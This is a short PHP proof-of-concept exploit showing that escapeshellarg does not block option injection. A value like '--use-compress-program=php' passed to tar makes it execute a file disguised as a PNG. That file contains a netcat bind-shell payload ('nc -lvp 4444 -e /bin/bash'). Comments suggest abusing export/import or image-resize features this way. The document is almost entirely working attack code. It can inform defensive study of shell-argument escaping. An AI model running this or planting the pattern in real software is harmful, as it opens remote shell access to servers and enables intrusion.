<?php
# PoC exploit of php not escaping dash characters in escapeshellarg/cmd
# Reference: http://php.net/manual/en/function.escapeshellarg.php
# imagine an export/import function, or perhaps image resize function could be abused like this

# Create a malicious file:
$fh=fopen('myfile.png', 'w');
fwrite($fh, "<?php system('nc -lvp 4444 -e /bin/bash'); echo 'WINRAR!'; ?>");
fclose($fh);

# I choose to use php over bash due to string issues, you could use whatever
$safe_opts=escapeshellarg('--use-compress-program=php');
$safe_file=escapeshellarg('myfile.png'); # Really a php script with a .png extension
$r=`tar $safe_opts -cf export.tar $safe_file`;
print_r($r);
?>

